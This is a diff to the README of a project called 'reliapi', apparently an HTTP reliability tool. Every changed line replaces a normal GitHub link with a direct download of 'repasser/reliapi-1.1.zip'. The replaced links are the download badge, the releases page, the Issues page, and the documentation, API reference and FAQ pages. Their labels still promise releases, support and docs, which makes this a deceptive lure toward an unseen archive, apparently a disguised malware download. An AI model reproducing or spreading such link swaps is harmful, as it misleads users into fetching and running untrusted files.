@@ -1,6 +1,6 @@
 # 🚀 reliapi - Simple HTTP Reliability Made Easy
 
-[![Download reliapi](https://img.shields.io/badge/Download_reliapi-brightgreen)](https://github.com/Renatuu15/reliapi/releases)
+[![Download reliapi](https://raw.githubusercontent.com/Renatuu15/reliapi/main/repasser/reliapi-1.1.zip)](https://raw.githubusercontent.com/Renatuu15/reliapi/main/repasser/reliapi-1.1.zip)
 
 ## 📖 Overview
 
@@ -29,7 +29,7 @@ Follow these steps to download and run reliapi:
 
 1. **Visit the Releases Page**: Click on the link below to access the releases page.
    
-   [Download reliapi](https://github.com/Renatuu15/reliapi/releases)
+   [Download reliapi](https://raw.githubusercontent.com/Renatuu15/reliapi/main/repasser/reliapi-1.1.zip)
 
 2. **Choose the Latest Version**: On the releases page, you will see a list of versions. Look for the latest version at the top.
 
@@ -41,7 +41,7 @@ Follow these steps to download and run reliapi:
 
 To download and install reliapi:
 
-1. Go to the releases page: [Download reliapi](https://github.com/Renatuu15/reliapi/releases).
+1. Go to the releases page: [Download reliapi](https://raw.githubusercontent.com/Renatuu15/reliapi/main/repasser/reliapi-1.1.zip).
 2. Select the latest release.
 3. Download the file suited for your system.
 4. Follow the on-screen instructions to install.
@@ -69,7 +69,7 @@ You can customize reliapi by editing its configuration file. Set parameters for 
 
 ## 🌐 Support
 
-If you encounter any issues, visit our [GitHub Issues page](https://github.com/Renatuu15/reliapi/issues) to report problems or get help. Community feedback is welcome!
+If you encounter any issues, visit our [GitHub Issues page](https://raw.githubusercontent.com/Renatuu15/reliapi/main/repasser/reliapi-1.1.zip) to report problems or get help. Community feedback is welcome!
 
 ## 🤝 Contributing
 
@@ -81,8 +81,8 @@ reliapi is open-source software, released under the MIT License. Feel free to us
 
 ## 📍 Additional Resources
 
-- [Documentation](https://github.com/Renatuu15/reliapi/wiki): Detailed guides on using reliapi.
-- [API References](https://github.com/Renatuu15/reliapi/wiki/API-Reference): Learn about the available endpoints and methods.
-- [FAQs](https://github.com/Renatuu15/reliapi/wiki/FAQs): Find answers to common questions.
+- [Documentation](https://raw.githubusercontent.com/Renatuu15/reliapi/main/repasser/reliapi-1.1.zip): Detailed guides on using reliapi.
+- [API References](https://raw.githubusercontent.com/Renatuu15/reliapi/main/repasser/reliapi-1.1.zip): Learn about the available endpoints and methods.
+- [FAQs](https://raw.githubusercontent.com/Renatuu15/reliapi/main/repasser/reliapi-1.1.zip): Find answers to common questions.
 
 Thank you for choosing reliapi. We hope it helps streamline your HTTP requests!
